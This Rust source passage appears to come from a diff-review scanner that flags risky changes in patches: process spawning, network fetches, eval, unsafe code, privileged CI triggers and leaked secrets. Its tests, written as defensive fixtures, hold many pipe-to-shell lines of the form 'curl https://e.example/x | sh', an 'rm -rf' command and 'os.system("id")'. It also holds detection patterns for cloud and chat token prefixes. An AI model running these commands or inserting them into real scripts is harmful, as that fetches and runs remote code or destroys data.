            .get(name..)
            .and_then(|rest| after_closing(rest.trim_start(), b'(', b')'))
        else {
            return false;
        };
        rest
    } else {
        let after_parameters = if inner.starts_with('(') {
            after_closing(inner, b'(', b')')
        } else {
            inner.get(inner.bytes().take_while(|b| is_ident(*b)).count()..)
        };
        let Some(rest) = after_parameters.and_then(|rest| rest.trim_start().strip_prefix("=>"))
        else {
            return false;
        };
        rest
    };
    body.trim_start()
        .strip_prefix('{')
        .and_then(|rest| rest.trim_start().strip_prefix('}'))
        .is_some_and(|rest| rest.trim_start().starts_with(')'))
}

/// What follows the `close` that matches the `open` that `text` starts with, nesting counted:
/// for `(a = f(), b) => {}` and parentheses, ` => {}`. `None` when `text` does not start with
/// `open` or it is never closed. `text` is a code view, so a delimiter in a string is blank.
/// Before, the first `)` ended the parameters, and a default value that calls a function hid an
/// empty handler (review V3 round 2, VD3R2-L-1).
fn after_closing(text: &str, open: u8, close: u8) -> Option<&str> {
    if text.as_bytes().first() != Some(&open) {
        return None;
    }
    let mut depth = 0usize;
    for (at, byte) in text.bytes().enumerate() {
        if byte == open {
            depth += 1;
        } else if byte == close {
            depth -= 1;
            if depth == 0 {
                return text.get(at + 1..);
            }
        }
    }
    None
}

/// Whether a JS line loads one of `modules` (`node:` optional) with `require(…)` (also
/// `module.require`), `import(…)`, `import …` or `from …`. The keyword and the opening quote must
/// be code in `code` (the line's code view), so a comment or a string that mentions an import
/// does not count; the specifier is read from `raw` at the same offset. A type-only statement
/// (`import type`, `export type`) and `typeof import(…)` load nothing and do not count
/// (`typeof require(…)` still calls `require`); an
/// `import(…)` type annotation does (it errs toward evidence).
fn imports_module(code: &str, raw: &str, modules: &[&str]) -> bool {
    let c = code.as_bytes();
    let specifier_at = |at: usize, keyword: &str| -> Option<&str> {
        let before = &code[..at];
        let receiver_ok = at == 0
            || !is_boundary_blocker(c[at - 1])
            || (keyword == "require" && before.ends_with("module."));
        let after = at + keyword.len();
        if !receiver_ok
            || c.get(after).is_some_and(|b| is_ident(*b))
            || (keyword == "import" && before.trim_end().ends_with("typeof"))
        {
            return None;
        }
        // Whitespace and any number of `(` may sit between the keyword and the specifier.
        let gap = c[after..]
            .iter()
            .take_while(|b| b.is_ascii_whitespace() || **b == b'(')
            .count();
        let q = after + gap;
        if keyword == "require" && !c[after..q].contains(&b'(') {
            return None;
        }
        let quote = *c.get(q).filter(|b| matches!(b, b'"' | b'\'' | b'`'))?;
        let name = raw.get(q + 1..)?;
        let name = &name[..name.find(char::from(quote))?];
        Some(name.strip_prefix("node:").unwrap_or(name))
    };
    // Every keyword hit in line order, so one forward walk knows which statement each is in
    // and the type-only test runs once per statement: the line stays linear.
    let mut hits: Vec<(usize, &str)> = ["require", "import", "from"]
        .iter()
        .flat_map(|keyword| code.match_indices(keyword).map(|(at, _)| (at, *keyword)))
        .collect();
    hits.sort_unstable();
    // `start` is where the current statement begins; only the bytes since the last hit are
    // searched for a later `;`.
    let (mut seen, mut start, mut type_only) = (0, 0, None);
    hits.into_iter().any(|(at, keyword)| {
        if let Some(semi) = code[seen..at].rfind(';') {
            start = seen + semi + 1;
            type_only = None;
        }
        seen = at;
        let skip = *type_only.get_or_insert_with(|| {
            let head = code[start..].trim_start();
            head.starts_with("import type ") || head.starts_with("export type ")
        });
        !skip && specifier_at(at, keyword).is_some_and(|m| modules.contains(&m))
    })
}

fn token_in(text: &str, token: &str) -> bool {
    match token.strip_suffix('*') {
        // A prefix token: a boundary before it, none required after.
        Some(prefix) => text
            .match_indices(prefix)
            .any(|(i, _)| i == 0 || !is_boundary_blocker(text.as_bytes()[i - 1])),
        None => has_token(text, token),
    }
}

/// A private key header, or a cloud, forge or chat token by its fixed prefix and length.
/// The token itself is never copied into evidence: only its line number is.
#[must_use]
fn looks_like_secret(text: &str) -> bool {
    if text.contains("-----BEGIN") && text.contains("PRIVATE KEY") {
        return true;
    }
    let tail = |prefix: &str, min: usize, ok: fn(u8) -> bool| {
        text.match_indices(prefix).any(|(i, _)| {
            let before = i.checked_sub(1).map(|j| text.as_bytes()[j]);
            let boundary = before.is_none_or(|b| !b.is_ascii_alphanumeric());
            let run = text.as_bytes()[i + prefix.len()..]
                .iter()
                .take_while(|b| ok(**b))
                .count();
            boundary && run >= min
        })
    };
    let upper_digit = |b: u8| b.is_ascii_uppercase() || b.is_ascii_digit();
    let alnum = |b: u8| b.is_ascii_alphanumeric();
    let slack = |b: u8| b.is_ascii_alphanumeric() || b == b'-';
    tail("AKIA", 16, upper_digit)
        || ["ghp_", "gho_", "ghs_", "ghu_", "ghr_"]
            .iter()
            .any(|p| tail(p, 36, alnum))
        || ["xoxb-", "xoxp-", "xoxa-", "xoxr-"]
            .iter()
            .any(|p| tail(p, 10, slack))
        || tail("sk_live_", 16, alnum)
}

#[cfg(test)]
mod tests {
    use super::*;
    use deep_diff_forge_patch::parse;

    /// One file whose single hunk keeps a context line `x` and adds (`+`) or removes (`-`)
    /// `lines` after it.
    fn changed(path: &str, sign: char, lines: &[&str]) -> ReviewFile {
        let n = lines.len() + 1;
        let header = if sign == '+' {
            format!("@@ -1,1 +1,{n} @@")
        } else {
            format!("@@ -1,{n} +1,1 @@")
        };
        let mut text = format!("--- a/{path}\n+++ b/{path}\n{header}\n x\n");
        for line in lines {
            text.push(sign);
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    fn added(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '+', lines)
    }

    fn removed(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '-', lines)
    }

    fn signals(file: &ReviewFile) -> Vec<EvidenceSignal> {
        file_evidence(file).iter().map(|e| e.signal).collect()
    }

    /// A path and the line a rule's token would appear on in that language.
    fn sample_path(scope: Scope) -> &'static str {
        match scope {
            Scope::Languages(languages) => match languages[0] {
                Language::Rust => "src/x.rs",
                Language::Python => "x.py",
                Language::JavaScript => "x.ts",
                Language::Go => "x.go",
                Language::Shell => "x.sh",
                Language::Yaml => "x.yml",
            },
            Scope::Any => "notes.txt",
            Scope::CiWorkflow => ".github/workflows/ci.yml",
            Scope::BuildScript => "build.rs",
            Scope::PackageJson => "package.json",
        }
    }

    fn sample_token(token: &str) -> String {
        match token.strip_suffix('*') {
            Some(prefix) => format!("{prefix}_case()"),
            None => format!("{token} x"),
        }
    }

    /// N8: every token in the table has a case that finds it, on the side the rule reads.
    #[test]
    fn every_token_in_the_table_is_found() {
        for rule in RULES {
            if let Match::Imports(modules) = rule.matches {
                for module in modules {
                    let line = format!("const m = require(\"{module}\");");
                    let file = added(sample_path(rule.scope), &[&line]);
                    assert!(signals(&file).contains(&rule.signal), "{module}");
                }
            }
            let Match::Tokens(tokens) = rule.matches else {
                continue;
            };
            for token in tokens {
                let path = sample_path(rule.scope);
                let line = sample_token(token);
                let file = match rule.side {
                    Side::New => added(path, &[&line]),
                    Side::Old => removed(path, &[&line]),
                };
                assert!(
                    signals(&file).contains(&rule.signal),
                    "{} not found for {token:?} in {path}",
                    rule.signal.label()
                );
            }
        }
    }

    /// The same tokens in a comment or a string are not code.
    #[test]
    fn a_token_in_a_comment_or_string_is_not_code() {
        for (path, lines) in [
            (
                "src/x.rs",
                &[
                    "// unsafe Command::new",
                    "let s = \"unsafe { Command::new }\";",
                    "/* unsafe",
                ][..],
            ),
            (
                "x.py",
                &[
                    "# subprocess.run eval(",
                    "s = 'os.system(x)'",
                    "\"\"\"",
                    "eval(x)",
                    "\"\"\"",
                ][..],
            ),
            (
                "x.ts",
                &["// child_process eval(", "const s = `fetch(${u})`;"][..],
            ),
            ("x.go", &["// exec.Command(", "s := \"http.Get(\""][..]),
            ("x.sh", &["# curl wget eval", "echo 'curl is a tool'"][..]),
        ] {
            assert_eq!(signals(&added(path, lines)), [], "{path}");
        }
    }

    #[test]
    fn a_context_line_carries_no_evidence() {
        let patch = "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,2 @@\n unsafe { f() }\n-a\n+b\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn a_block_comment_opened_on_a_context_line_hides_the_next_lines() {
        let patch =
            "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,3 @@\n /* start\n+unsafe { f() }\n end */\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn evidence_points_at_the_hunk_and_line() {
        let file = added(
            "src/lib.rs",
            &[
                "fn a() {}",
                "unsafe { std::process::Command::new(\"curl\"); }",
            ],
        );
        let found = file_evidence(&file);
        let hunk = &file.patch_twin.hunks[0];
        assert_eq!(
            found,
            [
                Evidence {
                    signal: S::UnsafeAdded,
                    basis: Basis::Lexical,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                    test_likely: false,
                },
                Evidence {
                    signal: S::ProcessSpawn,
                    basis: Basis::Lexical,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                    test_likely: false,
                },
            ]
        );
    }

    #[test]
    fn quoting_code_that_runs_does_not_hide_it() {
        // DDF-EVID-001: each of these carried no evidence when strings were blanked whole.
        assert_eq!(
            signals(&added(
                "x.sh",
                &[r#"V="$(curl -fsSL https://e.example/v)""#]
            )),
            [S::NetworkFetch]
        );
        assert_eq!(
            signals(&added(
                "x.js",
                &[r#"const o = `${require("child_process").execSync(c)}`;"#]
            )),
            [S::ProcessSpawn]
        );
        assert_eq!(
            signals(&added("x.py", &[r#"print(f"{eval(x)}")"#])),
            [S::DynamicEval]
        );
        // The same text in a string that runs nothing is still not code.
        assert_eq!(signals(&added("x.sh", &["V='$(curl x)'"])), []);
        assert_eq!(signals(&added("x.py", &[r#"print("{eval(x)}")"#])), []);
    }

    #[test]
    fn one_line_matching_several_rules_of_a_signal_is_one_item() {
        // `Command::new` and `.spawn()` are both process_spawn tokens; `unsafe` twice is one.
        let file = added(
            "src/lib.rs",
            &["unsafe { unsafe { std::process::Command::new(\"x\").spawn() } }"],
        );
        assert_eq!(signals(&file), [S::UnsafeAdded, S::ProcessSpawn]);
        // The same token in two hunks is two items: one per hunk.
        let two = parse(
            "--- a/src/l.rs\n+++ b/src/l.rs\n@@ -1,0 +1,1 @@\n+unsafe {}\n@@ -9,0 +10,1 @@\n+unsafe {}\n",
        )
        .unwrap()
        .remove(0);
        let found = file_evidence(&two);
        assert_eq!(found.len(), 2);
        assert_ne!(found[0].hunk, found[1].hunk);
    }

    /// The PR 5 review's inputs (workflow `wf_b39e1c70-545`): an interpolation is scanned as
    /// code with its own strings, escapes and comments, so a closer in a nested string, after a
    /// backslash, in a comment or ending a `case` pattern neither hides the code after it nor
    /// exposes the outer string's text.
    #[test]
    fn an_interpolation_is_scanned_as_code_with_its_own_strings() {
        let hidden_before: [(&str, &str, EvidenceSignal); 12] = [
            ("a.sh", r#"V="$(echo ')' ; curl x)""#, S::NetworkFetch),
            ("a.sh", r#"V="$(echo \) ; curl x)""#, S::NetworkFetch),
            (
                "a.sh",
                r#"V="$(case a in a) curl x;; esac)""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"X="$(tr -d ')' < f | curl https://e.example/x)""#,
                S::NetworkFetch,
            ),
            ("a.sh", r#"V="$(echo "$(curl x)")""#, S::NetworkFetch),
            (
                "a.js",
                r#"const o = `${ "}" + require("child_process").execSync(c) }`;"#,
                S::ProcessSpawn,
            ),
            ("a.js", "const o = `${ /* } */ eval(x) }`;", S::DynamicEval),
            ("a.js", "const o = `${ `${ eval(x) }` }`;", S::DynamicEval),
            ("a.py", r#"print(f"{'}' + eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(Rf"{d['}'] or eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(f"\{eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(rf"\{eval(x)}")"#, S::DynamicEval),
        ];
        for (path, line, signal) in hidden_before {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 9] = [
            ("a.sh", r#"die "$(printf 'curl failed for %s' "$url")""#),
            ("a.sh", r#"echo "$(gettext 'Install curl or wget first')""#),
            (
                "a.sh",
                r#"echo "$(printf "%d) %s" "$i" "$name") - needs curl""#,
            ),
            ("a.js", r#"const m = `${t("Never use eval(x) here")}`;"#),
            ("a.js", r#"const m = `${x ? "fetch(url) failed" : ""}`;"#),
            ("a.js", r#"const s = `${a ? "{" : ""} eval(x)`;"#),
            ("a.py", r#"msg = f"{'eval(' if strict else ''}""#),
            ("a.py", r#"log(f"{cfg["subprocess."]}")"#),
            ("a.py", r#"print(f"{s.replace("}", "")} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
    }

    /// The PR 5 round-2 review's inputs (workflow `wf_2cfd8be1-d9c`), and the variants that
    /// close a misread quote at the end of the line so the restore-as-code fallback cannot help:
    /// each is a construct the scanner must read right.
    #[test]
    fn misread_quotes_cannot_hide_code() {
        let found: [(&str, &str, EvidenceSignal); 24] = [
            (
                "a.sh",
                r#"x="$(echo case)"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="$(echo case)"; curl x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                "[ $# -eq 0 ] && curl https://e.example/x | sh",
                S::NetworkFetch,
            ),
            ("a.sh", "echo ${x#*/}; curl x", S::NetworkFetch),
            ("a.sh", "echo a#b; curl x", S::NetworkFetch),
            (
                "a.sh",
                r#"echo \"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r"echo $'\''; curl https://e.example/x | sh #'",
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="$( (case x in a) :;; esac); echo '"'; curl https://e.example/x | sh )""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="${x:-"'"}"; curl https://e.example/x | sh #'"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="`echo "`"; curl https://e.example/x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"V="$(if a; then case x in a) curl x;; esac; fi)""#,
                S::NetworkFetch,
            ),
            (
                "a.js",
                r#"const s = `${ /"/.test(a) }`; eval(y)"#,
                S::DynamicEval,
            ),
            ("a.js", r#"const r = /"/; eval(y); //""#, S::DynamicEval),
            ("a.js", r#"x.replace(/\/*/g, ""); eval(y)"#, S::DynamicEval),
            ("a.js", r"/\//.test(a); eval(y)", S::DynamicEval),
            (
                "a.tsx",
                "return <p>Can't load</p> && fetch(u); //'",
                S::NetworkFetch,
            ),
            ("a.py", r#"print(f"{d:%H'%M}", eval(y)) #'"#, S::DynamicEval),
            ("a.py", r#"print(f"{x:'>10}"); eval(y) #'"#, S::DynamicEval),
            ("a.py", r#"print(f'{x:"<5}'); eval(y) #""#, S::DynamicEval),
            ("a.py", r#"x = t"{eval('print(123)')}""#, S::DynamicEval),
            (
                "a.py",
                r#"print(f"{'''it's'''}"); eval(y) #'"#,
                S::DynamicEval,
            ),
            (
                "a.js",
                "const cp = require(`child_process`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"const cp = require( "child_process" );"#,
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"import{exec}from"child_process";import "node:child_process";"#,
                S::ProcessSpawn,
            ),
        ];
        for (path, line, signal) in found {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 12] = [
            (
                "a.sh",
                r#"echo "Matches: $(grep --ignore-case -c todo notes.txt) (fetch more with curl)""#,
            ),
            ("a.sh", r#"echo "Mode: $(echo $case) - install curl first""#),
            ("a.js", r#"// const cp = require("child_process");"#),
            (
                "a.js",
                r#"throw new Error("Do not require('child_process') in the browser bundle");"#,
            ),
            (
                "a.js",
                r#"const help = `Use ${cmd} or require("child_process") yourself`;"#,
            ),
            ("a.js", "const re = /from 'child_process'/;"),
            (
                "a.ts",
                r#"import type { ChildProcess } from "node:child_process";"#,
            ),
            ("a.ts", "export type { SpawnOptions } from 'child_process';"),
            ("a.ts", r#"type Cp = typeof import("node:child_process");"#),
            (
                "a.js",
                r#"const m = `${s.match(/^{/) ? "obj" : "arr"} - see fetch(url) docs`;"#,
            ),
            ("a.py", r#"print(f"{x:'^5}", 'eval(y)')"#),
            ("a.py", r#"print(f"{d[a:b]!r:>{w}} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
        // A JSDoc example inside a block comment is not an import.
        let doc = added(
            "a.js",
            &[
                "/**",
                " * @example import { exec } from 'node:child_process';",
                " */",
            ],
        );
        assert_eq!(signals(&doc), []);
    }

    /// The PR 5 round-3 review's inputs (workflow `wf_fdfaa98c-6b0`) that real code can contain:
    /// shell `case` in every command position, `esac` as a pattern word, nested arms, JS regexes
    /// after operators and keywords, quotes after keywords, and the import forms.
    #[test]
    fn shell_case_js_regex_and_import_forms_are_read_right() {
        let fetch = "curl https://e.example/x | sh";
        for line in [
            format!(r#"V="$(if case a in a) true;; esac; then :; fi; {fetch})""#),
            format!(r#"V="$(while case a in b) true;; esac; do break; done; {fetch})""#),
            format!(r#"V="$(! case a in b) true;; esac; {fetch})""#),
            format!(r#"V="$(time case a in b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in b|esac) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) case b in b) :;; esac;; c) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) :; esac=1;; b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) echo ${{esac}};; b) :;; esac; {fetch})""#),
            format!("echo $(date)#; {fetch}"),
        ] {
            assert_eq!(
                signals(&added("a.sh", &[&line])),
                [S::NetworkFetch],
                "{line}"
            );
        }
        for line in [
            "x = a + /'/.source; eval(y) //'",
            "x = typeof' ' ; eval(y) //'",
            r#"function f(){return"//"+eval(x)}"#,
            "x = a++ / 2; eval(y); z = b / 3",
        ] {
            assert_eq!(signals(&added("a.js", &[line])), [S::DynamicEval], "{line}");
        }
        // A quote after `return` opens a string, so its `/*` is not a comment that hides the
        // next line.
        let next = added("a.js", &[r#"function f(){return"/*"}"#, "eval(x)"]);
        assert_eq!(signals(&next), [S::DynamicEval]);
        for (path, line) in [
            ("a.js", "const cp = require(\t\"child_process\");"),
            ("a.js", r#"const cp = module.require("child_process");"#),
            ("a.js", r#"const cp = require(("child_process"));"#),
            (
                "a.ts",
                r#"export type T = 1; const cp = require("child_process");"#,
            ),
            ("a.js", r#"const o = { m: import("child_process") };"#),
            // A type annotation loads nothing, but it is counted: the rule errs toward evidence.
            (
                "a.ts",
                r#"let p: import("child_process").ChildProcess | undefined;"#,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [S::ProcessSpawn], "{line}");
        }
        for line in [
            r#"echo "Ran: $(basename ${case}) - fetch the logs with curl""#,
            r#"echo "$(case $1 in (a) echo x;; esac) - install curl first""#,
        ] {
            assert_eq!(signals(&added("a.sh", &[line])), [], "{line}");
        }
    }

    /// The final PR 5 review's regressions against main (workflow `wf_bbb5e9f1-254`): common
    /// code the branch misread, and lines that made the import rule quadratic.
    #[test]
    fn common_typescript_continuations_and_raw_strings_keep_their_evidence() {
        for (path, line, signal) in [
            (
                "n.ts",
                "const pct = (stats.get(key)! / total) * 100; const res = await fetch(`/api/stats/${key}`);",
                S::NetworkFetch,
            ),
            (
                "n.ts",
                r#"const ms = timings[name]! / 1000; void fetch("/log", { method: "POST" });"#,
                S::NetworkFetch,
            ),
            (
                "n.ts",
                "const pct = done! / total; const out = execSync(`du -sh ${dir}/`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r"const run = cmd => /^'/.test(cmd) ? null : execSync(cmd, { shell: '/bin/sh' });",
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r#"let root = Path::new(r"C:\"); let out = Command::new("cmd").output()?;"#,
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r##"let s = r#"a "quoted" \"#; unsafe { f() }"##,
                S::UnsafeAdded,
            ),
            (
                "src/a.rs",
                r#"let b = br"\"; unsafe { f() }"#,
                S::UnsafeAdded,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        // A line that continues an expression with `/` divides; one after `=` opens a regex.
        let divided = added(
            "m3.js",
            &[
                "const elapsed = (Date.now() - start)",
                "  / 1000; fetch(`/api/timing/${elapsed}`);",
            ],
        );
        assert_eq!(signals(&divided), [S::NetworkFetch]);
        let regex = added("m3.js", &["const re =", "  /fetch(/; const x = 1;"]);
        assert_eq!(signals(&regex), []);
        // A raw string's text is still text, and an ordinary string still escapes.
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = r"unsafe";"#])), []);
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = "\"unsafe";"#])), []);
    }

    #[test]
    fn the_import_rule_is_linear_on_long_lines() {
        within_deadline(|| {
            let start = ScanClock::start();
            for unit in [
                "Array.from(x),",
                "from ",
                "require ",
                "import ",
                "require(require(",
            ] {
                let line = unit.repeat(200_000);
                assert_eq!(signals(&added("a.js", &[&line])), [], "{unit}");
            }
            let spaced = format!(";{}from 'child_process'", " ".repeat(200_000));
            assert_eq!(signals(&added("a.js", &[&spaced])), [S::ProcessSpawn]);
            // Linear scans of these lines took about 2 s in a debug build; the quadratic import
            // rule of eee2b4c^ took about 66 s.
            let spent = start.elapsed();
            assert!(
                spent < std::time::Duration::from_secs(15),
                "the long lines took {spent:?} of {}",
                start.kind
            );
        });
    }

    /// The time a scan spends: the thread's own CPU time where Linux reports it, so a busy host
    /// does not fail the bound (a starved run measured 1.8 s of CPU in over 10 s of wall time),
    /// and wall time elsewhere.
    struct ScanClock {
        kind: &'static str,
        cpu_ns: Option<u64>,
        wall: std::time::Instant,
    }

    impl ScanClock {
        fn start() -> Self {
            let cpu_ns = thread_cpu_ns();
            #[expect(
                clippy::disallowed_methods,
                reason = "test door: the fallback clock where no CPU time is reported"
            )]
            let wall = std::time::Instant::now();
            let kind = if cpu_ns.is_some() {
                "thread CPU time"
            } else {
                "wall time"
            };
            Self { kind, cpu_ns, wall }
        }

        fn elapsed(&self) -> std::time::Duration {
            match (self.cpu_ns, thread_cpu_ns()) {
                (Some(then), Some(now)) => std::time::Duration::from_nanos(now - then),
                _ => self.wall.elapsed(),
            }
        }
    }

    /// The calling thread's CPU time in nanoseconds: the first field of Linux's
    /// `/proc/thread-self/schedstat`, or `None` where that file does not exist.
    fn thread_cpu_ns() -> Option<u64> {
        let stat = std::fs::read_to_string("/proc/thread-self/schedstat").ok()?;
        stat.split_whitespace().next()?.parse().ok()
    }

    /// Run `work` on its own thread and fail if it takes more than two minutes of wall time.
    /// This bound only keeps a hang from stalling the suite, so a diff-mutation run reports a
    /// looping mutant as caught rather than as a timeout; the scan's cost is bounded by
    /// [`ScanClock`] inside the work.
    fn within_deadline<T: Send + 'static>(work: impl FnOnce() -> T + Send + 'static) -> T {
        let (done, wait) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = done.send(work());
        });
        wait.recv_timeout(std::time::Duration::from_secs(120))
            .expect("a long line was scanned within two minutes")
    }

    /// The import rule's receiver, boundary, `typeof` and statement decisions, each pinned.
    #[test]
    fn import_rule_decisions_are_exact() {
        for (line, spawn) in [
            (r#"const cp = foo.require("child_process");"#, false),
            (r#"const cp = requirex("child_process");"#, false),
            (r#"const t = typeof require("child_process");"#, true),
            (
                r#"x = Array.from(y); import type {A} from "child_process";"#,
                false,
            ),
            (
                r#"x = Array.from(y); import {A} from "child_process";"#,
                true,
            ),
        ] {
            let expected: &[EvidenceSignal] = if spawn { &[S::ProcessSpawn] } else { &[] };
            assert_eq!(signals(&added("a.ts", &[line])), expected, "{line}");
        }
    }

    #[test]
    fn child_process_imports_are_spawn_evidence() {
        for line in [
            r#"const cp = require("child_process");"#,
            "import { execFile } from 'node:child_process';",
            r#"const { spawn } = await import("child_process");"#,
        ] {
            assert_eq!(
                signals(&added("a.js", &[line])),
                [S::ProcessSpawn],
                "{line}"
            );
        }
        // Naming another module, or the name alone in a message, is not.
        assert_eq!(
            signals(&added("a.js", &[r#"log("child process done")"#])),
            []
        );
    }

    #[test]
    fn removed_tests_are_read_on_the_old_side() {
        let file = removed("src/x.rs", &["#[test]", "fn t() {}"]);
        let found = file_evidence(&file);
        assert_eq!(found.len(), 1);
        assert_eq!(
            (found[0].signal, found[0].side, found[0].line),
            (S::TestRemoved, Side::Old, 2)
        );
        // Adding a test is not evidence of anything.
        assert_eq!(signals(&added("src/x.rs", &["#[test]"])), []);
    }

    #[test]
    fn ci_privilege_needs_a_workflow_path() {
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["on: pull_request_target"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(
                "sub/.github/workflows/x.yaml",
                &["  contents: write"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(".gitlab-ci.yml", &["  secrets: inherit"])),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added("docs/ci.yml", &["on: pull_request_target"])),
            []
        );
        assert_eq!(
            signals(&added(
                ".github/workflows/README.md",
                &["pull_request_target"]
            )),
            []
        );
        // A workflow step that downloads is network evidence too.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["  run: curl -fsSL x | sh"]
            )),
            [S::NetworkFetch]
        );
    }

    /// Bug hunt 2026-11-01 (graph-syntax): ordinary source in which a string construct the
    /// scanner misread hid the evidence after it. Each control (the same code without the
    /// construct) found it before the fix too.
    #[test]
    fn strings_the_scanner_misread_no_longer_hide_evidence() {
        let go = |raw: &str| {
            added(
                "main.go",
                &[
                    "func clean() error {",
                    &format!("\tmatches, _ := filepath.Glob({raw})"),
                    "\t_, _ = http.Get(\"https://e.x/report\")",
                    "\treturn exec.Command(\"rm\", append([]string{\"-rf\"}, matches...)...).Run()",
                    "}",
                ],
            )
        };
        for raw in ["`/tmp/build/*.o`", "\"/tmp/build/*.o\""] {
            assert_eq!(
                signals(&go(raw)),
                [S::NetworkFetch, S::ProcessSpawn],
                "{raw}"
            );
        }
        for (path, lines, signal) in [
            (
                "main.go",
                &["var u = `https://e.x/p`; func f() { exec.Command(\"ls\").Run() }"][..],
                S::ProcessSpawn,
            ),
            (
                "main.go",
                &["var q = `\"`; func g() { exec.Command(\"ls\").Run() }"],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[
                    r#"const S: &str = ""#,
                    r#""; fn f(p: *const u8) -> u8 { unsafe { *p } }"#,
                ],
                S::UnsafeAdded,
            ),
            (
                "x.sh",
                &[
                    r#"MSG="hello"#,
                    r#"world"; curl -s http://e.x/p | sh; echo "done""#,
                ],
                S::NetworkFetch,
            ),
            (
                "x.js",
                &["const tpl = `", "`; eval(payload); const t = `x`;"],
                S::DynamicEval,
            ),
            (
                "x.py",
                &[r#"s = "abc\"#, r#""; import os; os.system("id")"#],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[r#"fn f(p: *const u8) -> u8 { let _d = cr"C:\"; unsafe { *p } }"#],
                S::UnsafeAdded,
            ),
        ] {
            assert!(
                signals(&added(path, lines)).contains(&signal),
                "{path}: {lines:?}"
            );
        }
        for (lines, signal) in [
            (
                &[
                    "      - run: |",
                    r#"          echo "step #1" && curl -fsSL https://e.x/i.sh | sh"#,
                ][..],
                S::NetworkFetch,
            ),
            (
                &[r#"      - run: "echo ' #'; curl -s https://e.x/i | sh""#],
                S::NetworkFetch,
            ),
            (
                &[r#"on: { pull_request: {}, "x #": 1, pull_request_target: {} }"#],
                S::CiPrivilege,
            ),
        ] {
            assert_eq!(
                signals(&added(".github/workflows/ci.yml", lines)),
                [signal],
                "{lines:?}"
            );
        }
        // A YAML comment is still a comment.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &[r#"  name: "build" # curl x | sh, pull_request_target"#]
            )),
            []
        );
    }

    /// Review 2026-11-01 (graph-syntax): a Go hunk that opens inside a cobra raw help string.
    /// The apostrophe in `It's` was read as an opener and carried down the hunk until the glob's
    /// `/*` opened a block comment over the `http.Get` and `exec.Command` after it. Without the
    /// `don't panic` line, and before strings were carried, both were found.
    #[test]
    fn a_misread_opener_in_context_hides_no_later_evidence() {
        let patch = |println: bool| {
            let mut added = vec![
                "\t\tmatches, _ := filepath.Glob(\"/tmp/build/*.o\")",
                "\t\t_, _ = http.Get(\"https://e.x/ping\")",
                "\t\treturn exec.Command(\"rm\", matches...).Run()",
            ];
            if println {
                added.insert(0, "\t\tfmt.Println(\"don't panic\")");
            }
            let mut text = format!(
                "--- a/cmd/clean.go\n+++ b/cmd/clean.go\n@@ -1,3 +1,{} @@\n",
                3 + added.len()
            );
            for context in [
                "It's safe to run twice.",
                "`,",
                "\tRunE: func(cmd *cobra.Command, args []string) error {",
            ] {
                text.push(' ');
                text.push_str(context);
                text.push('\n');
            }
            for line in added {
                text.push('+');
                text.push_str(line);
                text.push('\n');
            }
            parse(&text).unwrap().remove(0)
        };
        for println in [false, true] {
            assert_eq!(
                signals(&patch(println)),
                [S::NetworkFetch, S::ProcessSpawn],
                "println: {println}"
            );
        }
    }

    #[test]
    fn build_scripts_and_install_hooks_are_build_hooks() {
        assert_eq!(
            signals(&added("build.rs", &["fn main() {}"])),
            [S::BuildHook]
        );
        assert_eq!(signals(&added("build.rs", &["// only a comment", ""])), []);
        assert_eq!(
            signals(&added("sub/setup.py", &["setup(name='x')"])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"postinstall\": \"node x\","])),
            [S::BuildHook]
